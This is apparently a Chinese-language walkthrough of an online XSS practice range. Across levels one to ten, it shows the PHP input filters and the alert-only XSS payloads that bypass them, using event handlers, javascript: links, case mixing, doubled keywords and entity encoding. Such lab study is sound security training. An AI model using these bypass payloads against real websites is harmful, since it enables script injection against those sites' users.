# xss平台练习

> 来源为一个在线靶场：
>
> http://test.ctf8.com/level1.php?name=test

## level1

<script>alert('xss')</script>

## level2

过滤php函数

(PHP 4, PHP 5, PHP 7)

htmlspecialchars — 将特殊字符转换为 HTML 实体

等于<不能用，这时候一种方法是黑名单绕过，就是不使用被过滤的符号，使用js的事件：

![image-20200915193548678](未命名.assets/image-20200915193548678.png)

![image-20200915194446612](未命名.assets/image-20200915194446612.png)

Payload:

"><script>alert(1)</script>

这样value=" "，不会检查我们的弹窗代码

![image-20200915201010853](未命名.assets/image-20200915201010853.png)

## level3

![image-20200915201317764](未命名.assets/image-20200915201317764.png)

Payload: 

' onmouseover=alert(1)//

单引号用来闭合，

### 定义和用法

onmouseover 事件会在鼠标指针移动到指定的对象上时发生。这里指定的就是搜索框了。

## less4

跟3一样，不过要用""进行闭合。

## less5

~~~javascript
$str = strtolower($_GET["keyword"]); //将字符串转化为小写，所以大小写不能绕过
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
~~~

对输入进行了过滤。

但是没有对<>进行过滤，所以我们可以使用伪协议来进行构造

payload:

~~~
"><iframe src=javascript:alert(1)>
"> <a href="javascript:alert(1)">bmjoker</a>
"> <a href="javascript:%61lert(1)">bmjoker</a> //
~~~

iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。

其中第二第三个payload是定义了一个链接，在访问时触发js代码。

## level6

~~~php
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
~~~

这个是它的过滤，过滤很严格，但是发现没有过滤大小写，那么

Payload:

~~~
"> <Script>alert(1)</script> //
"> <img Src=x OnError=alert(1)> //
"><a HrEf="javascript:alert(1)">bmjoker</a>//
"><svg x=" " Onclick=alert(1)>
"><ScriPt>alert(1)<sCrIpt>"
" OncliCk=alert(1) //
~~~

前几关的payload,改变一些大小写就可以使用了。

## level7

~~~php
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
~~~

这个又加了大小写的限制，那么

Payload:

~~~
"><sscriptcript>alert(1)</sscriptcript>
"><a hrhrefef=javascriscriptpt:alert(1)>bmjoker</a>
~~~

我好奇的是标签重复也可以使用吗？

后来才发现script标签被替换成空了，所以正好还是一个这样的标签，最后就成功弹出了。

## level8

![image-20200916210303331](xss平台练习.assets/image-20200916210303331.png)

实体字符绕过：

~~~
javascrip&#x74;:alert(1)
javasc&#x72;ipt:alert`1` 
javasc&#x0072;ipt:alert`1`
~~~

不过值得注入的地方是`竟然可以绕过括号。

## level9

~~~php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
if(false===strpos($str7,'http://')) //这个是新加的，但是没所谓
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
~~~

> <script>alert('xss')</script>

这个直接全部绕过了，有点蒙。。。然后仔细看了源码发现：

![image-20200916211326753](xss平台练习.assets/image-20200916211326753.png)

Emmmm....

不过正确的绕过方式如下：

~~~
javascrip&#x74;:alert(1)//http://xxx.com //利用注释
javascrip&#x74;:%0dhttp://xxx.com%0dalert(1) //不利用注释
javascrip&#x74;:%0ahttp://xxx.com%0daalert(1) //不利用注释
~~~

## level10

这次加强了对标签的检查：

~~~
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
~~~

![image-20200916213831898](xss平台练习.assets/image-20200916213831898.png)

我们从这里就可以看到，其实是把输入框给隐藏了，其实还是有输入框的。

Pyload:

~~~
keyword = test&t_sort="type="text"onclick="alert(1)
keyword = test&t_sort="type="text" onmouseover="alert(1)
keyword = test&t_sort="type="text" onmouseover=alert`1`
~~~

我们通过闭合然后是的输入框显示出来，然后用js时间就可以出发xss

